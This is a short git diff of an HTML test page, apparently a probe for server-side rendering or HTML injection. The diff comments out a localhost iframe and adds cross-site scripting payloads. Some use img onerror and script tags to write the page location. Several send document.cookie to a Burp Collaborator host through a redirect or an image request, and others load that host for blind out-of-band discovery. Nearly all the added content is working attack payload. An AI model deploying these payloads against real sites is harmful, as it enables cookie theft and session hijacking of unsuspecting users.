@@ -1,6 +1,16 @@
 <html>
 <body>
 	<h1>Hi </h1>
- <iframe src="http://localhost/" width="1200" height="900"></iframe> 
+
+	<img src="x" onerror="document.write('test')" />
+<script>document.write(JSON.stringify(window.location))</script>
+<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>
+
+<!--Basic blind discovery, load a resource-->
+<img src="http://ke2mfoqsq66ue2tcefs2ftdjiao0cp.burpcollaborator.net"/>
+<img src=x onerror="location.href='http://ke2mfoqsq66ue2tcefs2ftdjiao0cp.burpcollaborator.net/?c='+ document.cookie">
+<script>new Image().src="http://ke2mfoqsq66ue2tcefs2ftdjiao0cp.burpcollaborator.net/?c="+encodeURI(document.cookie);</script>
+<link rel=attachment href="http://ke2mfoqsq66ue2tcefs2ftdjiao0cp.burpcollaborator.net">
+ <!--<iframe src="http://localhost/" width="1200" height="900"></iframe> -->
 </body>
 </html>	
